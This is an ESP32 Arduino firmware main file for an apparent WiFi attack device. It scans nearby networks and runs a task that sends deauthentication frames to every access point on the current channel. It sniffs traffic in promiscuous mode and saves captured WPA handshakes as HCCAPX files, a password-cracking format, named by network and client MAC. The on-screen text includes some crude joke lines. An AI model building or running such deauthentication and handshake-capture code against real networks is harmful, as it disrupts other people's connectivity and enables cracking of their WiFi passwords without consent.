#include <Arduino.h>
#include <esp_task_wdt.h>
#include "config.h"
#include "eapol.h"
#include "wifi.h"
#include "log.h"
#include "sd card.h"
#include "display.h"
#include "cpu mon.h"
#include "button.h"
#include "setup.h"
#include "hccapx.h"
#include "packet processor.h"
#include "misc.h"

using namespace std;

void init_tasks() {
	xTaskCreatePinnedToCore([](void* _) {
		while (1) {
			delay((menu == 1 || menu == 2 || menu == 4) ? LOG_MENU_UPDATE_INTERVAL : 1000);
			draw();
			currentPacketCounts::packetc = currentPacketCounts::deauthc = currentPacketCounts::probec = currentPacketCounts::datac = currentPacketCounts::beaconc = currentPacketCounts::rssitol = 0;
		}
	}, "update", UPDATE_TASK_STACK_SIZE, NULL, 3, NULL, UPDATE_TASK_CORE);
	xTaskCreatePinnedToCore([](void* _) {
		while (1) {
			const unsigned long currentTime = millis();
			for (auto& [channel, aps] : AP_Map) {
				for (auto& ap : aps) {
					if (currentTime - ap.lastPacketUpdate >= 1000) {
						ap.rssi = (ap.packetc == 0) ? 0 : ap.rssitol / ap.packetc;
						ap.rssitol = 0;
						ap.packetc = 0;
						ap.lastPacketUpdate = currentTime;
					}
					for (auto& sta : ap.STAs) {
						if (currentTime - sta.lastPacketUpdate >= 1000) {
							sta.rssi = (sta.packetCount == 0) ? 0 : sta.rssitol / sta.packetCount;
							sta.rssitol = 0;
							sta.packetPerSecond = sta.packetCount;
							sta.packetCount = 0;
							sta.lastPacketUpdate = currentTime;
						}
					}
					ap.hccapx_list.erase(
						std::remove_if(ap.hccapx_list.begin(), ap.hccapx_list.end(), [&](HCCAPX_Entry& entry) {
								if ((entry.hccapx.message_pair == 0) || (!ap.hccapx_saved)) { //TODO: might impliment M3/M4 saving later
									log2(TFT_GREENYELLOW, "Completed hccapx for AP: %s", ap.ssid.c_str());
									ap.hccapx_saved = true;
									
									// printHCCAPX(hccapx);

									char macStr[18];
									snprintf(macStr, sizeof(macStr), "%02X_%02X_%02X_%02X_%02X_%02X", MAC2STR(entry.hccapx.mac_sta));
									saveHCCAPX(ap.ssid + "_" + String(macStr), (uint8_t*)&entry.hccapx, sizeof(hccapx_t));
									return true;
								}
								return false;
							}
						),
						ap.hccapx_list.end()
					);
				}
			}
			// if (!heap_caps_check_integrity_all(true)) log1(TFT_RED, "Corrupt Heap!!!!!!!!!!!!!!!!"); // temp debug TODO:might be good to remove this
			// for (auto& [channel, aps] : AP_Map) for (auto& ap : aps) Serial.printf("AP: %s, Last: %i\n", ap.ssid.c_str(), millis() - ap.lastPacketUpdate);
			delay(UPDATE_TASK_INTERVAL);
		}
	}, "sta/ap update", AP_STA_UPDATE_TASK_STACK_SIZE, NULL, 3, NULL, AP_STA_UPDATE_TASK_CORE);
	xTaskCreatePinnedToCore([](void* _) {
		while (1) {
			Unconnected_STA_Map.erase(remove_if(Unconnected_STA_Map.begin(), Unconnected_STA_Map.end(), [&](const Unconnected_STA& usta) {
				return usta.connected || millis() - usta.lastPacketUpdate >= USTA_TIMEOUT;
			}), Unconnected_STA_Map.end());
			for_each_unconnected_sta for_each_sta_in_aps if (memcmp(usta.mac.data(), sta.mac.data(), 6) == 0) {
				usta.connected = true;
				break;
			}
			delay(1000);
		}
	}, "uSTA update", USTA_UPDATE_TASK_STACK_SIZE, NULL, 3, NULL, USTA_UPDATE_TASK_CORE);
	xTaskCreatePinnedToCore([](void* _) {
		while (1) {
			button.tick();
			delay(BUTTON_TICK_INTERVAL);
		}
	}, "button", BUTTON_TASK_STACK_SIZE, NULL, 3, NULL, BUTTON_TASK_CORE);
	xTaskCreatePinnedToCore([](void* _) {
		static unsigned long lastDeauthTime = 0;
		while (1) {
			if (deauthActive) {
				digitalWrite(2, HIGH);
				uint32_t current_time = millis();
				delay((current_time - lastDeauthTime >= DEAUTH_INTERVAL) ? 0 : (DEAUTH_INTERVAL - (current_time - lastDeauthTime)));
				for (const auto& ap : AP_Map[channels[channel_index]]) sendDeauth(ap.bssid.data());
				// for (const auto& ap : AP_Map[channels[channel_index]]) for (const auto& sta : ap.STAs) sendBAR(ap.bssid.data(), sta.mac.data());
				lastDeauthTime = millis();
			} else digitalWrite(2, LOW),delay(60); //yeah im just too free...this might be bad
		}
	}, "deauth", DEAUTH_STACK_SIZE, NULL, 3, NULL, DEAUTH_TASK_CORE);
	#if ENABLE_PROBE_SENDING_NO_SCAN
	if (no_scan_mode) xTaskCreatePinnedToCore([](void* _) {while(1) esp_wifi_80211_tx(WIFI_IF_STA, probe_packet, sizeof(probe_packet), false),delay(PROBE_INTERVAL);}, "asker", PROBE_TASK_STACK_SIZE, NULL, 2, NULL, PROBE_TASK_CORE);
	#endif
}
void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
	addPkt((wifi_promiscuous_pkt_t*)buf, type);
	// handle_packet((wifi_promiscuous_pkt_t*)buf, type);
}
void scan() {
	esp_wifi_set_promiscuous_rx_cb(sniffer);
	if (no_scan_mode) {
		sprite.println("\nNo Scan Mode Enabled");
		sprite.println("im gayyyyyyyyyyyyyyyyyyyyy");
		sprite.println("this shit is WIP(forever lol)");
		sprite.pushSprite(0, 0);
		for (int i = 1; i <= 13; i++) channels.push_back(i);
		while (digitalRead(0)) delay(20);
		while (!digitalRead(0)) delay(20);
		esp_wifi_set_promiscuous(true);
		return;
	}
	sprite.pushSprite(0, 0);

	digitalWrite(2, HIGH);
	esp_wifi_set_promiscuous(false);
	wifi_scan_config_t scan_config = {
		.ssid = NULL,
		.bssid = NULL,
		.channel = 0,
		.show_hidden = true,
		.scan_type = WIFI_SCAN_TYPE_ACTIVE,
		.scan_time = {.active = {.min = SCAN_TIME_MIN,.max = SCAN_TIME_MAX}},
		.home_chan_dwell_time = 1
	};
	ESP_ERROR_CHECK(esp_wifi_scan_start(&scan_config, true));
	uint16_t ap_num = 0;
	ESP_ERROR_CHECK(esp_wifi_scan_get_ap_num(&ap_num));
	wifi_ap_record_t ap_records[ap_num];
	ESP_ERROR_CHECK(esp_wifi_scan_get_ap_records(&ap_num, ap_records));
	Serial.printf("Total APs found: %d\n", ap_num);

	channels.clear();
	AP_Map.clear();
	tft.fillScreen(TFT_BLACK);
	sprite.fillRect(0, 0, sprite.width(), sprite.height(), TFT_BLACK);
	sprite.setCursor(0, 0);
	sprite.setTextColor(0x7FF0);

	for (int i = 0; i < ap_num; i++) {
		wifi_ap_record_t ap = ap_records[i];
		String ssid = (char*)ap.ssid;
		if (ssid == "") ssid = "<Hidden>";
		if 		(ap.authmode == WIFI_AUTH_WPA3_PSK) ssid = "W3_" + ssid;
		else if (ap.authmode == WIFI_AUTH_WPA2_WPA3_PSK) ssid = "W23_" + ssid;
		Serial.printf("SSID: %s, Channel: %d\n", ssid.c_str(), ap.primary);
		sprite.printf("Ch %-2d|", ap.primary);
		sprite.setTextColor((ap.rssi > -60) ? 0xFFB6C1 : (ap.rssi > -70) ? TFT_YELLOW : (ap.rssi > -85) ? TFT_ORANGE : TFT_RED);
		sprite.print(ap.rssi);
		sprite.setTextColor(0x7FF0);
		sprite.println("|" + ssid);

		if (find(channels.begin(), channels.end(), ap.primary) == channels.end()) channels.push_back(ap.primary);

		AP_Info info;
		info.ssid = ssid.substring(0, AP_SSID_MAX_LEN);
		memcpy(info.bssid.data(), ap.bssid, 6);
		AP_Map[ap.primary].push_back(info);
	}
	if (channels.empty()) {for (int i = 1; i <= 13; i++) channels.push_back(i);sprite.println("No AP Found.");}
	sprite.pushSprite(0, 0);
	esp_wifi_set_channel(channels[channel_index], WIFI_SECOND_CHAN_NONE);
	digitalWrite(2, LOW);
	while (digitalRead(0)) delay(20);
	while (!digitalRead(0)) delay(20);
	esp_wifi_set_promiscuous(true);
}
void setup() {
	xTaskCreatePinnedToCore([](void* _) { // to hopefully prevent weird errors
		esp_task_wdt_init(WDT_TIMEOUT, WDT_PANIC); // to "prevent" random hanging
		Serial.begin(115200);
		pinMode(2, OUTPUT);

		psramInit();
		// esp_wifi_set_rx_buf_num(20); // Default is 10
		// esp_wifi_set_psram_rx_buf(true);
		setup_init();
		init_log1();
		init_log2();
		init_sd();
		init_display();
		init_button();
		init_packet_processor();
		init_wifi();
		scan();
		init_tasks();
		init_monitor();
		
		vTaskDelete(NULL);
	}, "setup", SETUP_TASK_STACK_SIZE, NULL, 3, NULL, 1);
	// Serial.printf("Vector '%s' at: %p\n", "taskCpuUsageList", taskCpuUsageList.data());
	// if ((uintptr_t)taskCpuUsageList.data() >= 0x3F800000 && (uintptr_t)taskCpuUsageList.data() < 0x40000000) Serial.println("Allocated in PSRAM");
	// else Serial.println("Allocated in Internal RAM");

	// Serial.printf("Vector '%s' at: %p\n", "channels", channels.data());
	// if ((uintptr_t)channels.data() >= 0x3F800000 && (uintptr_t)channels.data() < 0x40000000) Serial.println("Allocated in PSRAM");
	// else Serial.println("Allocated in Internal RAM");

	// auto& v = AP_Map[0];
	// v.resize(1);
	// Serial.printf("Map '%s' at: %p\n", "AP_Map", v.data());
	// if ((uintptr_t)v.data() >= 0x3F800000 && (uintptr_t)v.data() < 0x40000000) Serial.println("Allocated in PSRAM");
	// else Serial.println("Allocated in Internal RAM");

	// Serial.printf("Vector '%s' at: %p\n", "Unconnected_STA_Map", Unconnected_STA_Map.data());
	// if ((uintptr_t)Unconnected_STA_Map.data() >= 0x3F800000 && (uintptr_t)Unconnected_STA_Map.data() < 0x40000000) Serial.println("Allocated in PSRAM");
	// else Serial.println("Allocated in Internal RAM");
}
void loop() {vTaskDelete(NULL);}